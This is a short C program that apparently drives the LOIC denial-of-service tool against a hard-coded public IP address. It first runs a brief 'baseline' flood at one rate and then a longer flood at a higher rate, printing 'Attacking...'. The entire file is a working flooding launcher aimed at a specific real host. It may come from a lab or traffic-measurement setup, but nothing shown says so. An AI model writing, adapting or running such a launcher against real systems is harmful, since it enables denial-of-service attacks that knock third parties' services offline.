#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include "attack_process.h"

int main(int argc, const char *argv[]){
    char* cwd = malloc(SIZE_PATH * sizeof(char));
    cwd = get_loic_path(cwd);

    char** arg_list = malloc(5 * sizeof(char*));
    int time_to_live;

    arg_list[PROGRAM_PATH] = cwd;
    arg_list[IP] = "162.243.111.72";
    arg_list[RATE_FLAG] = "-r";
    arg_list[RATE_NUMBER] = "100";
    arg_list[FINAL_ARG] = NULL;
    time_to_live = 2;

    printf("Setting baseline...\n");
    call_attack(cwd, arg_list, time_to_live);

    arg_list[RATE_NUMBER] = "300";
    time_to_live = 5;
    printf("Attacking...\n");
    call_attack(cwd, arg_list, time_to_live);

    return 0;
}
